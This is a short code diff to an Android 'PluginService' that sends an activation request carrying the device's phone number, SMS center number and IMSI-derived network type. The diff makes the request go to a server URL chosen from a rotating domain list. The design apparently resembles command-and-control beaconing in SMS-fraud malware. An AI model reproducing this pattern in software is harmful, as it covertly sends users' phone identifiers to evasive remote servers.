@@ -14,6 +14,7 @@ import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
 import com.xstd.plugin.Utils.CommonUtil;
+import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.api.ActiveRequest;
 import com.xstd.plugin.api.ActiveResponse;
@@ -166,6 +167,10 @@ public class PluginService extends IntentService {
                         }
 
                         SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
+                        if (Config.DEBUG) {
+                            Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
+                                            + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
+                        }
                         ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                                      , Config.CHANNEL_CODE
                                                                      , unique
@@ -173,7 +178,9 @@ public class PluginService extends IntentService {
                                                                      , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
                                                                      , SettingManager.getInstance().getKeySmsCenterNum()
                                                                      , AppRuntime.PHONE_NUMBER
-                                                                     , SettingManager.getInstance().getKeyLastErrorInfo());
+                                                                     , SettingManager.getInstance().getKeyLastErrorInfo()
+                                                                     , DomanManager.getInstance(getApplicationContext())
+                                                                           .getOneAviableDomain() + "/sais/");
                         //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
                         SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                         ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
